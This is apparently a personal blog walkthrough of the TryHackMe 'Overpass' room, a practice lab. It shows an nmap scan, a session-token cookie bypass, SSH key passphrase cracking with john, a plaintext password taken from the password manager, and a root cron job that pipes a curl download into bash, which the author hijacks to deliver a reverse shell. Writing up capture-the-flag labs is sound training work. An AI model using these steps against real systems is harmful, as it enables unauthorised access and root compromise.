---
title: Walkthrough - Overpass
published: true
---

What happens when some broke CompSci students make a password manager?

[https://tryhackme.com/room/overpass](https://tryhackme.com/room/overpass)

* * *

## Enumerate

nmap -p- -T4 10.10.198.148 -vvv



* * * 

## Exploit

- Checking the /admin page discovered using dirb we discover inspecting elements and checking login.js that we can set sessiontoken to gain access to this ssh key

![0xskar](/assets/overpass01.png)

- now that we have a user "James" and sshkey we can login to ssh
- save the rsa key and ssh2john and feed to john

```shell
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/overpass]
└─$ john james.john                                                                       
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (james.rsa)     
1g 0:00:00:00 DONE 1/3 (2022-07-14 13:13) 20.00g/s 103660p/s 103660c/s 103660C/s james.rsarsa13..rsajames.rsa13
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- ssh in
- cat user and to-do.txt to find hints
- get system password from ov

```shell
james@overpass-prod:~$ /usr/bin/overpass
Welcome to Overpass
Options:
1 Retrieve Password For Service
2 Set or Update Password For Service
3 Delete Password For Service
4 Retrieve All Passwords
5 Exit
Choose an option: 4
System   saydrawnlyingpicture
```

```shell
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

- check /etc/crontab

```shell
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user command
17 * * * * root    cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

- cronjob curls a script and running it as root we can probably take advantage of this

```shell
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

- edit with vim and create /downloads/src/buildscript.sh with reverse shell on attacker

![0xskar](/assets/overpass02.png)

* * * 